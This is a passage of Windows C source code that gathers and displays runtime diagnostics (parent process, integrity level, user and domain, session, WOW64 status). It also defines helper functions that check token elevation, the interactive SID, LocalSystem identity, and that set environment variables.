        _strcat(lpReport, szBuffer);
        _strcat(lpReport, TEXT(" ("));

        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        bFound = FALSE;

        ProcessList = (PSYSTEM_PROCESS_INFORMATION)ucmGetSystemInfo(SystemProcessInformation);
        if (ProcessList) {

            pList = ProcessList;

            for (;;) {

                if ((ULONG_PTR)pList->UniqueProcessId == pbi.InheritedFromUniqueProcessId) {

                    _strncpy(szBuffer,
                        MAX_PATH,
                        pList->ImageName.Buffer,
                        pList->ImageName.Length / sizeof(WCHAR));

                    bFound = TRUE;

                    break;
                }
                if (pList->NextEntryDelta == 0) {
                    break;
                }
                pList = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
            }
            ucmxHeapFree(ProcessList);
        }

        if (bFound) {
            _strcat(lpReport, szBuffer);
        }
        else {
            _strcat(lpReport, TEXT("Non-existent Process"));
        }
        _strcat(lpReport, TEXT(")"));

    }

    //
    // 3. Query various token releated data.
    //
    //
    // 3.1 Integrity value.
    // 3.2 User\Domain name
    // 3.3 Session info
    //
    status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &hToken);

    if (NT_SUCCESS(status)) {

        LengthNeeded = 0;
        status = NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            pTIL = (PTOKEN_MANDATORY_LABEL)ucmxHeapAlloc(LengthNeeded);

            if (pTIL) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenIntegrityLevel,
                    pTIL,
                    LengthNeeded,
                    &LengthNeeded);

                if (NT_SUCCESS(status)) {

                    dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
                        (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) {
                        lpValue = L"UntrustedIL";
                    }
                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
                        lpValue = L"LowIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)  //skip SECURITY_MANDATORY_MEDIUM_PLUS_RID
                    {
                        lpValue = L"MediumIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
                    {
                        lpValue = L"HighIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
                    {
                        lpValue = L"SystemIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
                    {
                        lpValue = L"ProtectedProcessIL";
                    }

                    _strcpy(szBuffer, TEXT("\r\nPID="));
                    ultostr((ULONG)GetCurrentProcessId(), _strend(szBuffer));
                    _strcat(szBuffer, TEXT(", "));
                    _strncpy(_strend(szBuffer), 40, lpValue, 40);
                    _strcat(lpReport, szBuffer);
                }
                ucmxHeapFree(pTIL);
            }
        }

        //
        // Domain\User name.
        //
        LengthNeeded = 0;
        status = NtQueryInformationToken(
            hToken,
            TokenUser,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            ptu = (PTOKEN_USER)ucmxHeapAlloc(LengthNeeded);

            if (ptu) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenUser,
                    ptu,
                    LengthNeeded,
                    &LengthNeeded);

                if (NT_SUCCESS(status)) {

                    SecurityQualityOfService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
                    SecurityQualityOfService.ImpersonationLevel = SecurityImpersonation;
                    SecurityQualityOfService.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
                    SecurityQualityOfService.EffectiveOnly = FALSE;

                    InitializeObjectAttributes(
                        &lobja,
                        NULL,
                        0L,
                        NULL,
                        NULL);

                    lobja.SecurityQualityOfService = &SecurityQualityOfService;

                    status = LsaOpenPolicy(
                        NULL,
                        &lobja,
                        POLICY_LOOKUP_NAMES,
                        &PolicyHandle);

                    if (NT_SUCCESS(status)) {

                        status = LsaLookupSids(
                            PolicyHandle,
                            1,
                            &ptu->User.Sid,
                            &ReferencedDomains,
                            &Names);

                        if ((NT_SUCCESS(status)) && (status != STATUS_SOME_NOT_MAPPED)) {

                            if (ReferencedDomains != NULL) {
                                szBuffer[0] = 0;

                                _strncpy(
                                    szBuffer,
                                    MAX_PATH,
                                    ReferencedDomains->Domains[0].Name.Buffer,
                                    ReferencedDomains->Domains[0].Name.Length / sizeof(WCHAR));

                                _strcat(lpReport, TEXT("\r\n"));
                                _strcat(lpReport, szBuffer);
                                _strcat(lpReport, TEXT("\\"));

                            }

                            if (Names != NULL) {
                                szBuffer[0] = 0;

                                _strncpy(
                                    szBuffer,
                                    MAX_PATH,
                                    Names->Name.Buffer,
                                    Names->Name.Length / sizeof(WCHAR));

                                _strcat(lpReport, szBuffer);
                            }
                        }

                        if (ReferencedDomains) LsaFreeMemory(ReferencedDomains);
                        if (Names) LsaFreeMemory(Names);

                        LsaClose(PolicyHandle);
                    }

                }

                ucmxHeapFree(ptu);
            }
        }

        //
        // Session info
        //
        LengthNeeded = 0;
        _strcpy(szBuffer, TEXT("\r\nSessionId="));
        ultostr(SessionId, _strend(szBuffer));
        _strcat(lpReport, szBuffer);

        _strcat(lpReport, TEXT("\r\nInteractive Winstation="));
        if (ucmIsUserWinstaInteractive())
            _strcat(lpReport, TEXT("yes"));
        else
            _strcat(lpReport, TEXT("no"));

        NtClose(hToken);
    }

    //
    // 4. Wow64
    //
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);

    status = NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessBasicInformation,
        &pebi,
        sizeof(pebi),
        NULL);

    if (NT_SUCCESS(status)) {
        _strcpy(szBuffer, TEXT("\r\nWOW64 Enabled="));
        ultostr(pebi.IsWow64Process, _strend(szBuffer));
        _strcat(lpReport, szBuffer);
    }

    if (ReturnData == FALSE) {

        MessageBox(
            GetDesktopWindow(),
            lpReport,
            GetCommandLine(),
            MB_ICONINFORMATION);

        ucmxHeapFree(lpReport);
        lpReport = NULL;
    }

    return lpReport;
}

/*
* ucmDestroyRuntimeInfo
*
* Purpose:
*
* Release memory allocated by ucmQueryRuntimeInfo if ReturnData flag used.
*
*/
BOOLEAN ucmDestroyRuntimeInfo(
    _In_ LPWSTR RuntimeInfo)
{
    return ucmxHeapFree((PVOID)RuntimeInfo);
}

/*
* ucmIsUserWinstaInteractive
*
* Purpose:
*
* Return TRUE if current user operates on Winstation with visible surfaces, FALSE otherwise.
*
*/
BOOL ucmIsUserWinstaInteractive(
    VOID
)
{
    BOOL bResult = TRUE;
    USEROBJECTFLAGS uof;
    HWINSTA hWinStation;

    //
    // Open current winstation.
    //
    hWinStation = GetProcessWindowStation();
    if (hWinStation) {
        //
        // Query winstation flags.
        //
        if (GetUserObjectInformation(
            hWinStation,
            UOI_FLAGS,
            &uof,
            sizeof(USEROBJECTFLAGS),
            NULL))
        {
            //
            // Are winstation has visible surfaces?
            //
            if ((uof.dwFlags & WSF_VISIBLE) == 0)
                bResult = FALSE;
        }
    }
    return bResult;
}

/*
* ucmIsUserHasInteractiveSid
*
* Purpose:
*
* pbInteractiveSid will be set to TRUE if current user has interactive sid, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ucmIsUserHasInteractiveSid(
    _In_ HANDLE hToken,
    _Out_ PBOOL pbInteractiveSid)
{
    BOOL IsInteractiveSid = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG LengthNeeded = 0;

    DWORD i;

    SID_IDENTIFIER_AUTHORITY SidAuth = SECURITY_NT_AUTHORITY;
    PSID InteractiveSid = NULL;
    PTOKEN_GROUPS groupInfo = NULL;

    do {

        status = NtQueryInformationToken(
            hToken,
            TokenGroups,
            NULL,
            0,
            &LengthNeeded);

        if (status != STATUS_BUFFER_TOO_SMALL)
            break;

        groupInfo = (PTOKEN_GROUPS)ucmxHeapAlloc(LengthNeeded);

        if (groupInfo == NULL)
            break;

        status = NtQueryInformationToken(
            hToken,
            TokenGroups,
            groupInfo,
            LengthNeeded,
            &LengthNeeded);

        if (!NT_SUCCESS(status))
            break;

        status = RtlAllocateAndInitializeSid(
            &SidAuth,
            1,
            SECURITY_INTERACTIVE_RID,
            0, 0, 0, 0, 0, 0, 0,
            &InteractiveSid);

        if (!NT_SUCCESS(status))
            break;

        for (i = 0; i < groupInfo->GroupCount; i++) {

            if (RtlEqualSid(
                InteractiveSid,
                groupInfo->Groups[i].Sid))
            {
                IsInteractiveSid = TRUE;
                break;
            }
        }

    } while (FALSE);

    if (groupInfo != NULL)
        ucmxHeapFree(groupInfo);

    if (pbInteractiveSid)
        *pbInteractiveSid = IsInteractiveSid;

    if (InteractiveSid)
        RtlFreeSid(InteractiveSid);

    return status;
}

/*
* ucmIsLocalSystem
*
* Purpose:
*
* pbResult will be set to TRUE if current account is run by system user, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ucmIsLocalSystem(
    _Out_ PBOOL pbResult)
{
    BOOL                            bResult = FALSE;

    NTSTATUS                        status = STATUS_UNSUCCESSFUL;
    HANDLE                          hToken = NULL;

    ULONG                           LengthNeeded = 0;

    PSID                            SystemSid = NULL;
    PTOKEN_USER                     ptu = NULL;
    SID_IDENTIFIER_AUTHORITY        NtAuth = SECURITY_NT_AUTHORITY;

    status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &hToken);

    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(
            hToken,
            TokenUser,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            ptu = (PTOKEN_USER)ucmxHeapAlloc(LengthNeeded);

            if (ptu) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenUser,
                    ptu,
                    LengthNeeded,
                    &LengthNeeded);

                if (NT_SUCCESS(status)) {

                    status = RtlAllocateAndInitializeSid(
                        &NtAuth,
                        1,
                        SECURITY_LOCAL_SYSTEM_RID,
                        0, 0, 0, 0, 0, 0, 0,
                        &SystemSid);

                    if (NT_SUCCESS(status)) {
                        bResult = RtlEqualSid(ptu->User.Sid, SystemSid);
                        RtlFreeSid(SystemSid);
                    }

                }
                ucmxHeapFree(ptu);
            }
            else {
                status = STATUS_INSUFFICIENT_RESOURCES;
            }
        } //STATUS_BUFFER_TOO_SMALL
        NtClose(hToken);
    }

    if (pbResult)
        *pbResult = bResult;

    return status;
}

/*
* ucmGetProcessElevationType
*
* Purpose:
*
* Returns process elevation type.
*
*/
BOOL ucmGetProcessElevationType(
    _In_opt_ HANDLE ProcessHandle,
    _Out_ TOKEN_ELEVATION_TYPE * lpType
)
{
    HANDLE hToken = NULL, processHandle = ProcessHandle;
    NTSTATUS Status;
    ULONG BytesRead = 0;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;

    if (ProcessHandle == NULL) {
        processHandle = GetCurrentProcess();
    }

    Status = NtOpenProcessToken(processHandle, TOKEN_QUERY, &hToken);
    if (NT_SUCCESS(Status)) {

        Status = NtQueryInformationToken(hToken, TokenElevationType, &TokenType,
            sizeof(TOKEN_ELEVATION_TYPE), &BytesRead);

        NtClose(hToken);
    }

    if (lpType)
        *lpType = TokenType;

    return (NT_SUCCESS(Status));
}

/*
* ucmIsProcessElevated
*
* Purpose:
*
* Returns process elevation state.
*
*/
NTSTATUS ucmIsProcessElevated(
    _In_ ULONG ProcessId,
    _Out_ PBOOL Elevated)
{
    NTSTATUS Status;
    ULONG Dummy;
    HANDLE ProcessHandle, TokenHandle;
    CLIENT_ID ClientId;
    TOKEN_ELEVATION TokenInfo;
    OBJECT_ATTRIBUTES ObAttr = RTL_INIT_OBJECT_ATTRIBUTES(NULL, 0);

    ClientId.UniqueProcess = UlongToHandle(ProcessId);
    ClientId.UniqueThread = NULL;

    if (Elevated) *Elevated = FALSE;

    Status = NtOpenProcess(&ProcessHandle, MAXIMUM_ALLOWED, &ObAttr, &ClientId);
    if (NT_SUCCESS(Status)) {

        Status = NtOpenProcessToken(ProcessHandle, TOKEN_QUERY, &TokenHandle);
        if (NT_SUCCESS(Status)) {

            TokenInfo.TokenIsElevated = 0;
            Status = NtQueryInformationToken(TokenHandle,
                TokenElevation, &TokenInfo,
                sizeof(TOKEN_ELEVATION), &Dummy);

            if (NT_SUCCESS(Status)) {
                if (Elevated) *Elevated = (TokenInfo.TokenIsElevated > 0);
            }
            NtClose(TokenHandle);
        }
        NtClose(ProcessHandle);
    }

    return Status;
}

/*
* ucmSetEnvironmentVariable
*
* Purpose:
*
* SetEnvironmentVariable replacement.
*
*/
BOOL ucmSetEnvironmentVariable(
    _In_ LPCWSTR lpName,
    _In_ LPCWSTR lpValue
)
{
    NTSTATUS ntStatus;
    UNICODE_STRING Name, Value;

    ntStatus = RtlInitUnicodeStringEx(&Name, lpName);
    if (!NT_SUCCESS(ntStatus)) {
        return FALSE;
    }

    if (lpValue) {
        ntStatus = RtlInitUnicodeStringEx(&Value, lpValue);
        if (!NT_SUCCESS(ntStatus)) {
            return FALSE;
        }

        ntStatus = RtlSetEnvironmentVariable(NULL, &Name, &Value);
    }
    else {
        ntStatus = RtlSetEnvironmentVariable(NULL, &Name, NULL);
    }

    return (NT_SUCCESS(ntStatus));

}
